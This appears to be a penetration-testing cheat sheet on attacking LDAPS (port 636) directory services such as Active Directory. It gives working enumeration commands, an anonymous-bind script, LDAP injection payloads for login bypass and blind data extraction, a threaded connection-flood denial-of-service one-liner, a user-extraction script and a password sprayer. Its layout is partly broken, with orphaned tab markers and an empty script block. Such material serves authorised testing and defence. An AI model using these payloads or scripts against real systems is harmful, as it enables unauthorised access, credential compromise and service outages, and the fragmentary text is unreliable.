## Overview

Port **636** hosts **LDAPS (Lightweight Directory Access Protocol Secure)**, which is LDAP wrapped in SSL/TLS encryption. It provides encrypted access to directory services, most commonly **Microsoft Active Directory (AD)** but also OpenLDAP, 389 Directory Server, and Oracle Internet Directory. LDAPS is the implicit TLS counterpart to LDAP on port 389 (which can optionally use STARTTLS).

::note
LDAPS is a **goldmine** during penetration tests. Directory services store users, groups, computers, organizational units, GPOs, passwords, and trust relationships. Gaining any level of LDAP access often leads to full domain compromise.
::

| Detail              | Value                                                        |
| ------------------- | ------------------------------------------------------------ |
| **Port**            | 636                                                          |
| **Protocol**        | TCP (LDAP over SSL/TLS)                                      |
| **Service**         | LDAPS                                                        |
| **Related Ports**   | 389 (LDAP), 3268 (Global Catalog), 3269 (GC over SSL)       |
| **RFCs**            | RFC 4511 (LDAPv3), RFC 4513 (Auth), RFC 2830 (STARTTLS)     |
| **Encryption**      | Implicit TLS (connection is encrypted from the start)        |
| **Common Software** | Microsoft AD DS, OpenLDAP, 389 DS, FreeIPA, Oracle ID, Apache DS |
| **Default Base DN** | Derived from domain (e.g., `DC=corp,DC=local`)               |

::tabs
  :::tabs-item{icon="i-lucide-info" label="LDAP vs LDAPS"}
  | Feature         | LDAP (389)                | LDAPS (636)                     |
  | --------------- | ------------------------- | ------------------------------- |
  | Encryption      | None (or optional STARTTLS) | Implicit TLS from connection  |
  | Authentication  | Plaintext possible        | Always encrypted                |
  | Certificate     | Optional                  | Required (server cert)          |
  | Common Use      | Internal/legacy           | External-facing / secure comms  |
  | MITM Risk       | High (without STARTTLS)   | Low (if certs validated)        |
  :::

  :::tabs-item{icon="i-lucide-shield-alert" label="Why It Matters"}
  - Exposes the **entire directory structure** — users, groups, computers, OUs
  - Anonymous bind may leak sensitive attributes even over TLS
  - Credential stuffing yields domain-wide access
  - LDAP queries can reveal **password policies**, **service accounts**, **SPNs** for Kerberoasting
  - Misconfigured ACLs allow **password resets**, **group modifications**, **DCSync**
  - Certificate theft enables **persistent authentication** via PKINIT
  - LDAP injection in web apps can bypass authentication entirely
  :::

### RootDSE Enumeration (Unauthenticated)

The RootDSE is accessible without authentication and reveals critical directory information.

```bash [ldapsearch RootDSE]
ldapsearch -x -H ldaps://<TARGET_IP>:636 -s base -b "" "(objectClass=*)" "*" + 2>/dev/null
```

```bash [RootDSE Specific Attributes]
ldapsearch -x -H ldaps://<TARGET_IP>:636 -s base -b "" "(objectClass=*)" \
  namingContexts defaultNamingContext rootDomainNamingContext \
  dnsHostName serverName currentTime \
  supportedLDAPVersion supportedSASLMechanisms \
  domainControllerFunctionality forestFunctionality domainFunctionality \
  isGlobalCatalogReady supportedControl supportedCapabilities 2>/dev/null
```

```bash [Nmap RootDSE]
nmap -sT -p 636 --script=ldap-rootdse <TARGET_IP>
```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python ldap3"}
  ```python [anonymous_bind.py]
  import ldap3
  import sys

  target = sys.argv[1]
  base_dn = sys.argv[2] if len(sys.argv) > 2 else ""

  server = ldap3.Server(target, port=636, use_ssl=True, get_info=ldap3.ALL)

  # Anonymous bind
  conn = ldap3.Connection(server, auto_bind=True)
  print(f"[+] Anonymous bind successful!")
  print(f"[*] Server info:\n{server.info}")

  if base_dn:
      conn.search(base_dn, '(objectClass=*)', search_scope=ldap3.SUBTREE,
                   attributes=['dn', 'objectClass', 'cn', 'sAMAccountName'])
      for entry in conn.entries:
          print(entry)
  else:
      # Use naming contexts from RootDSE
      for nc in server.info.naming_contexts:
          print(f"\n[*] Naming Context: {nc}")
          conn.search(nc, '(objectClass=*)', search_scope=ldap3.LEVEL,
                       attributes=['dn', 'objectClass'])
          for entry in conn.entries[:10]:
              print(f"  {entry.entry_dn}")

  conn.unbind()
  ```

  ```bash [Run Anonymous Bind Script]
  python3 anonymous_bind.py <TARGET_IP> "DC=corp,DC=local"
  ```
  :::


### Password Policy Enumeration

```bash [Default Domain Password Policy]
ldapsearch -x -H ldaps://<TARGET_IP>:636 \
  -D "user@corp.local" -w "password" \
  -b "DC=corp,DC=local" "(objectClass=domainDNS)" \
  minPwdLength maxPwdAge minPwdAge pwdHistoryLength \
  lockoutThreshold lockoutDuration lockOutObservationWindow \
  pwdProperties
```

```bash [Fine-Grained Password Policies]
ldapsearch -x -H ldaps://<TARGET_IP>:636 \
  -D "user@corp.local" -w "password" \
  -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" \
  "(objectClass=msDS-PasswordSettings)" \
  cn msDS-MinimumPasswordLength msDS-MaximumPasswordAge \
  msDS-LockoutThreshold msDS-LockoutDuration msDS-PSOAppliesTo
```

::note
Understanding the password policy is critical before brute-forcing. Key values:
- **lockoutThreshold** — Number of failed attempts before lockout (0 = no lockout)
- **lockoutDuration** — How long the lockout lasts
- **minPwdLength** — Minimum password length
- **pwdHistoryLength** — Number of remembered passwords
::

```python [ldaps_auth_test.py]
import sys
```

## LDAP Injection

### Concept

LDAP injection exploits web applications that construct LDAP queries from user input without proper sanitization. Since LDAPS is the same protocol over TLS, the injection techniques are identical.

### Authentication Bypass Payloads

::tabs
  :::tabs-item{icon="i-lucide-lock-open" label="Login Bypass"}
  ```text [Simple Bypass — Username Field]
  *
  ```

  ```text [OR True Injection]
  admin)(|(password=*
  ```

  ```text [Wildcard Bypass]
  *)(uid=*))(|(uid=*
  ```

  ```text [Close Filter Injection]
  admin)(&)
  ```

  ```text [Comment-Style Bypass]
  admin)(|(objectClass=*
  ```

  ```text [Null Byte Injection]
  admin%00
  ```

  ```text [Always True]
  *)(objectClass=*
  ```

  ```text [Password Field Bypass]
  *)(uid=*
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Filter Injection"}
  ```text [Original Query]
  (&(uid=USER_INPUT)(password=PASS_INPUT))
  ```

  ```text [Injected — Username: admin)(|(password=*]
  (&(uid=admin)(|(password=*)(password=PASS_INPUT)))
  → Always true for admin
  ```

  ```text [Injected — Username: *)(uid=*))(|(uid=*]
  (&(uid=*)(uid=*))(|(uid=*)(password=PASS_INPUT)))
  → Returns all users
  ```

  ```text [Injected — Username: admin)(&)]
  (&(uid=admin)(&)(password=PASS_INPUT))
  → Empty AND is true
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Data Extraction"}
  ```text [Enumerate Attribute Existence]
  *)(mail=*
  *)(telephoneNumber=*
  *)(userPassword=*
  *)(description=*
  ```

  ```text [Blind LDAP Injection — Character Extraction]
  admin*)(uid=a*
  admin*)(uid=b*
  admin*)(uid=c*
  ...iterate through characters
  ```

  ```text [Boolean-Based Blind]
  *)(cn=admin*
  → If response differs from:
  *)(cn=nonexistent*
  → Character confirmed
  ```

  ```text [Enumerate Usernames]
  *)(sAMAccountName=a*
  *)(sAMAccountName=b*
  *)(sAMAccountName=admin*
  ```
  :::
::

## Denial of Service

### Connection Exhaustion

```bash [LDAP Connection Flood]
python3 -c "
import ldap3
import threading

def flood():
    while True:
        try:
            s = ldap3.Server('<TARGET_IP>', port=636, use_ssl=True)
            c = ldap3.Connection(s, auto_bind=True)
            c.search('', '(objectClass=*)', search_scope=ldap3.BASE)
        except: pass

for i in range(100):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

import time; time.sleep(300)
"
```

  :::tabs-item{icon="i-lucide-file-code" label="Quick Scripts"}
  ```python [extract_users.py — Extract All AD Users]
  #!/usr/bin/env python3
  import ldap3, sys

  server = ldap3.Server(sys.argv[1], port=636, use_ssl=True, get_info=ldap3.ALL)
  conn = ldap3.Connection(server, user=sys.argv[2], password=sys.argv[3], auto_bind=True)

  base_dn = server.info.other['defaultNamingContext'][0]
  print(f"[*] Base DN: {base_dn}")

  conn.search(base_dn,
      '(&(objectClass=user)(!(objectClass=computer)))',
      attributes=['sAMAccountName','userPrincipalName','description',
                  'memberOf','pwdLastSet','lastLogon','userAccountControl'])

  for entry in conn.entries:
      uac = int(str(entry.userAccountControl)) if entry.userAccountControl else 0
      status = "DISABLED" if uac & 2 else "ENABLED"
      desc = str(entry.description) if entry.description else ""
      print(f"{entry.sAMAccountName} | {status} | {desc}")

  print(f"\n[+] Total users: {len(conn.entries)}")
  conn.unbind()
  ```

  ```bash [Run Extract Users]
  python3 extract_users.py <TARGET_IP> "user@corp.local" "password"
  ```

  ```python [ldap_spray.py — LDAPS Password Sprayer]
  #!/usr/bin/env python3
  import ldap3, sys, time

  target = sys.argv[1]
  domain = sys.argv[2]
  userfile = sys.argv[3]
  password = sys.argv[4]
  delay = int(sys.argv[5]) if len(sys.argv) > 5 else 0

  server = ldap3.Server(target, port=636, use_ssl=True)
  with open(userfile) as f:
      users = [u.strip() for u in f]

  print(f"[*] Spraying {len(users)} users with: {password}")
  for user in users:
      upn = f"{user}@{domain}"
      try:
          c = ldap3.Connection(server, user=upn, password=password, auto_bind=True)
          print(f"[+] VALID: {upn}:{password}")
          c.unbind()
      except ldap3.core.exceptions.LDAPBindError:
          pass
      except Exception as e:
          print(f"[!] Error: {e}")
          break
      if delay: time.sleep(delay)
  ```

  ```bash [Run Sprayer]
  python3 ldap_spray.py <TARGET_IP> corp.local users.txt "Spring2024!" 2
  ```
